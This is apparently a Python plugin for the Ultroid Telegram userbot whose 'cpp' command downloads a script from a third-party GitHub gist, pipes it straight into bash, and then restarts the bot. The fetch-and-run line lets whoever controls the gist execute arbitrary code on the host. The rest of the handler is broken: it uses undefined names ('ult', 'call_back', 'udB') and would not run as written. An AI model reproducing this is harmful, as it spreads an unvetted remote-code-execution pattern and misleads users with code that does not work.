from . import ultroid_cmd, get_string, bash, callback
import os, sys
@ultroid_cmd(pattern="cpp",manager=True)
async def cht(e):
  c = await e.eor(get_string("com_1"))
  a,b = await bash(f"curl -L https://gist.githubusercontent.com/rooted-cyber/1bd2b7d3eb4d66ab06ab5e83098395e3/raw/cpp | bash")
  await c.reply(a)
  ok = await ult.eor(get_string("bot_5"))
  call_back()
  who = "bot" if ult.client._bot else "user"
  udB.set_key("_RESTART", f"{who}_{ult.chat_id}_{ok.id}")
    
  if len(sys.argv) > 1:
    os.execl(sys.executable, sys.executable, "main.py")
  else:
    os.execl(sys.executable, sys.executable, "-m", "pyUltroid")


